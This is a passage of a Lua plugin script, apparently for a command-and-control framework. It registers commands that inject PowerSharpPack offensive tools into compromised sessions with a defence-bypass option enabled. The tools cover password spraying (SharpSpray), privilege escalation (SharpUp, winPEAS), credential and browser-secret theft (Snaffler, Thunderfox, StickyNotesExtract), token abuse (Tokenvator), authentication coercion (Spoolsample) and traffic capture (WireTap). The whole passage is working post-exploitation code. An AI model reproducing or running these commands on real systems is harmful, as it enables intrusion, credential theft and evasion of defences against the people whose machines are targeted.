    local arch = session.Os.Arch
    local function_name = "Invoke-SharpSpray"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpSpray.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpSpray", run_Invoke_SharpSpray, "powersharppack Invoke-SharpSpray", "T1059.001")

-- Invoke-SharpSSDP
local function run_Invoke_SharpSSDP(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpSSDP"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpSSDP.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpSSDP", run_Invoke_SharpSSDP, "powersharppack Invoke-SharpSSDP", "T1059.001")

-- Invoke-SharpStay
local function run_Invoke_SharpStay(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpStay"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpStay.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpStay", run_Invoke_SharpStay, "powersharppack Invoke-SharpStay", "T1059.001")

-- Invoke-SharpUp
local function run_Invoke_SharpUp(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpUp"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpUp.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpUp", run_Invoke_SharpUp, "powersharppack Invoke-SharpUp", "T1059.001")

-- Invoke-Sharpview
local function run_Invoke_Sharpview(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Sharpview"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Sharpview.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Sharpview", run_Invoke_Sharpview, "powersharppack Invoke-Sharpview", "T1059.001")

-- Invoke-SharpWatson
local function run_Invoke_SharpWatson(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpWatson"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpWatson.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpWatson", run_Invoke_SharpWatson, "powersharppack Invoke-SharpWatson", "T1059.001")

-- Invoke-Sharpweb
local function run_Invoke_Sharpweb(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Sharpweb"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Sharpweb.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Sharpweb", run_Invoke_Sharpweb, "powersharppack Invoke-Sharpweb", "T1059.001")

-- Invoke-SharpWSUS
local function run_Invoke_SharpWSUS(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpWSUS"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpWSUS.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpWSUS", run_Invoke_SharpWSUS, "powersharppack Invoke-SharpWSUS", "T1059.001")

-- Invoke-Snaffler
local function run_Invoke_Snaffler(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Snaffler"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Snaffler.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Snaffler", run_Invoke_Snaffler, "powersharppack Invoke-Snaffler", "T1059.001")

-- Invoke-Spoolsample
local function run_Invoke_Spoolsample(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Spoolsample"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Spoolsample.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Spoolsample", run_Invoke_Spoolsample, "powersharppack Invoke-Spoolsample", "T1059.001")

-- Invoke-StandIn
local function run_Invoke_StandIn(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-StandIn"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-StandIn.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-StandIn", run_Invoke_StandIn, "powersharppack Invoke-StandIn", "T1059.001")

-- Invoke-StickyNotesExtract
local function run_Invoke_StickyNotesExtract(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-StickyNotesExtract"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-StickyNotesExtract.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-StickyNotesExtract", run_Invoke_StickyNotesExtract, "powersharppack Invoke-StickyNotesExtract", "T1059.001")

-- Invoke-Thunderfox
local function run_Invoke_Thunderfox(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Thunderfox"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Thunderfox.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Thunderfox", run_Invoke_Thunderfox, "powersharppack Invoke-Thunderfox", "T1059.001")

-- Invoke-Tokenvator
local function run_Invoke_Tokenvator(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Tokenvator"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Tokenvator.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Tokenvator", run_Invoke_Tokenvator, "powersharppack Invoke-Tokenvator", "T1059.001")

-- Invoke-UrbanBishop
local function run_Invoke_UrbanBishop(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-UrbanBishop"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-UrbanBishop.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-UrbanBishop", run_Invoke_UrbanBishop, "powersharppack Invoke-UrbanBishop", "T1059.001")

-- Invoke-Whisker
local function run_Invoke_Whisker(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Whisker"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Whisker.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Whisker", run_Invoke_Whisker, "powersharppack Invoke-Whisker", "T1059.001")

-- Invoke-winPEAS
local function run_Invoke_winPEAS(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-winPEAS"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-winPEAS.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-winPEAS", run_Invoke_winPEAS, "powersharppack Invoke-winPEAS", "T1059.001")

-- Invoke-WireTap
local function run_Invoke_WireTap(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-WireTap"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-WireTap.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-WireTap", run_Invoke_WireTap, "powersharppack Invoke-WireTap", "T1059.001")